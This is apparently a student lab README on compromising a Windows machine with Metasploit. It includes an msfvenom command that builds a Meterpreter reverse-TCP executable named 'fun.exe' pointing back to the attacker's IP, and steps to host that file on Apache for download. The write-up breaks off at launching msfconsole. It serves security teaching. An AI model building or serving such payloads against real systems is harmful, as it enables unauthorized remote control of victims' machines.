# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

### OUTPUT:

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/2d80e84f-792a-464e-bec1-1889b94a2cbf)

Create a malicious executable file fun.exe using msfvenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/827c4167-8dd5-4c85-9e1d-9055c821c113)

copy the fun.exe into the apache /var/www/html folder 

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/382438be-c5da-4780-b756-e64087e939e3)

Start apache server sudo systemctl apache2 start

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/eea3b465-5526-484b-9965-ba18231cc749)

Check the status of apache2

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/76e3a5b5-e1fb-4326-a364-f4760cbca773)

Invoke msfconsole:

![image](https://github.com/Vanitha-SM/Compromising-windows-using-Metasploit/assets/119557985/42c9c42b-ecfe-45d6-9c09-2da05406b031)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
